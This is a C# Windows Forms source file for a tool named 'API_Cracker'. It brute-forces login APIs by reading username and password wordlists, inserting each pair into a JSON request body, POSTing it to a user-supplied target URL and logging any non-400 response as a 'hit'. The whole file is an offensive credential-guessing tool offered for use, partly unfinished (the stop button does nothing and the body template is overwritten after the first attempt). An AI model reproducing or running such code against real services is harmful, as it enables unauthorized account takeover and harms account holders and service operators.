using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace API_Cracker
{
    public partial class Main : Form
    {

        #region Variables
        private Stopwatch _stopwatch = new Stopwatch();
        private string _targetUrl, _jsonBody;

        private List<string>
            _usernameList = new List<string>(),
            _passwordList = new List<string>(),
            _hitsList = new List<string>();

        private int _hits, _usernameCounter, _passwordCounter ;
        private long _usernameListCount, _passwordListCount;
        private bool _isCracking = false;

        private Thread _elapsedThread;
        #endregion
        public Main()
        {
            InitializeComponent();
            _elapsedThread = new Thread(ElapsedWatcher);
        }

        private void startBtn_Click(object sender, EventArgs e)
        {
            if (!_isCracking)
            {
                _targetUrl = targetTB.Text;
                _jsonBody = jsonTB.Text;
                _stopwatch.Restart();
                _stopwatch.Start();
                _elapsedThread.Start();
                startBtn.Text = "STOP"; 
                
                StartCracking();
            }

            else
            {
                // stop cracking

                // stop stopwatch
                _stopwatch.Stop();
                startBtn.Text = "START";
            }

            _isCracking = !_isCracking;
        }

        private void StartCracking()
        {
            ThreadPool.SetMaxThreads(20, 20);

            // determinate if user provided wordlist or single string

            if (!IsPath(unameTB.Text) && IsPath(passTB.Text))
            {
                new Thread(() => 
                {
                    _usernameCounter = 1;
                    using var reader = new StreamReader(passTB.Text);
                    string line;
                    while ((line = reader.ReadLine()) != null && _hits < 1)
                    {
                        TryCredentials($"{unameTB.Text}\n{line}");
                        //ThreadPool.QueueUserWorkItem(TryCredentials, $"{unameTB.Text}\n{line}");
                        Thread.Sleep(100);
                    }
                }).Start();
            }
        }

        private bool IsPath(string value) => File.Exists(value);

        private void TryCredentials(object args)
        {
            var username = args.ToString().Split('\n')[0];
            var password = args.ToString().Split('\n')[1];
            _jsonBody = _jsonBody.Replace("{UNAME}", username).Replace("{PASS}", password);

            var httpWebRequest = WebRequest.Create(_targetUrl);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";
            httpWebRequest.ContentLength = Encoding.UTF8.GetByteCount(_jsonBody);

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                streamWriter.Write(_jsonBody);
            }

            try
            {
                var httpResponse = (HttpWebResponse) httpWebRequest.GetResponse();

                if (httpResponse.StatusCode != HttpStatusCode.BadRequest)
                {
                    _hitsList.Add($"{username}:{password}");
                    _hits++;
                    InvokeSetText(pHits, $"Hits: {_hits}");
                    Debug.WriteLine($"Current combo: {username}:{password}\n^ HIT");
                }
            }

            catch(WebException e)
            {
                Debug.WriteLine($"Current combo: {username}:{password}\n^ {e.Message}");
            }

            _passwordCounter++;
            InvokeSetText(pPass, $"Password: ({_passwordCounter}/{_passwordListCount})");
        }

        private static void InvokeSetText(Control control, string value) 
            => control.Invoke((MethodInvoker) delegate{ control.Text = value; });

        private void unameBtn_Click(object sender, EventArgs e) => PickFile(0);
        private void passBtn_Click(object sender, EventArgs e) => PickFile(1);

        private void Main_Load(object sender, EventArgs e)
        {

        }

        private void PickFile(int i)
        {
            // 0: uname, 1: pass

            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() != DialogResult.OK) return;

            if (i == 0)
            {
                unameTB.Text = openFileDialog.FileName;

                Cursor = Cursors.WaitCursor;

                _usernameListCount = CountLines(openFileDialog.FileName);
                pUname.Text = $"Username: (0/{_usernameListCount})";

                foreach(var line in File.ReadAllLines(openFileDialog.FileName))
                    if(!string.IsNullOrEmpty(line))
                        _usernameList.Add(line);

                Cursor = Cursors.Default;
            }

            else
            {
                passTB.Text = openFileDialog.FileName;

                Cursor = Cursors.WaitCursor;

                _passwordListCount = CountLines(openFileDialog.FileName); 
                pPass.Text = $"Password: (0/{_passwordListCount})";

                foreach (var line in File.ReadAllLines(openFileDialog.FileName))
                    if (!string.IsNullOrEmpty(line))
                        _passwordList.Add(line);

                Cursor = Cursors.Default;
            }
        }

        // faster method to determinate file line's count
        private long CountLines(string path)
        {
            var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.None, 1024 * 1024);
            long lineCount = 0;
            var buffer = new byte[1024 * 1024];
            int bytesRead;

            do
            {
                bytesRead = fs.Read(buffer, 0, buffer.Length);
                for (var i = 0; i < bytesRead; i++)
                    if (buffer[i] == '\n')
                        lineCount++;
            } while (bytesRead > 0);

            fs.Close();

            return lineCount;
        }

        private void ElapsedWatcher()
        {
            while (_isCracking)
            {
                InvokeSetText(pElapsed, $"Elapsed: {_stopwatch.Elapsed}");
                Thread.Sleep(10);
            }
        }
    }
}
